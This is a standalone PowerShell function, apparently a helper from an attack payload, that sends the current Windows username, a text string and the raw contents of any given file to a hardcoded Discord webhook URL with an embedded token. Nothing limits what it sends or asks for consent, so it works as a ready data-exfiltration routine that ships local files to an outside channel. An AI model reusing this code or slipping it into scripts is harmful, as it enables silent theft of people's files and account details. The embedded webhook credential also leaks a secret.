function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discordapp.com/api/webhooks/1073986113166905364/y0pF_Wsr4RR__Fi0IcFO3FK8-tbR7ElRM6rN7YqC56O4d2b_5DfY6EzrW9wSPzRYZ7IG'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
    $Headers = @{'Content-Type'='application/json'}
    $BodyJson = $Body | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method POST -Headers $Headers -Body $BodyJson
}

if (-not ([string]::IsNullOrEmpty($file))){
    $Headers = @{'Content-Type'='multipart/form-data'}
    $FileContent = Get-Content $file -Encoding Byte
    Invoke-RestMethod -Uri $hookurl -Method POST -Headers $Headers -InFile $file -ContentType "application/octet-stream"
}

}
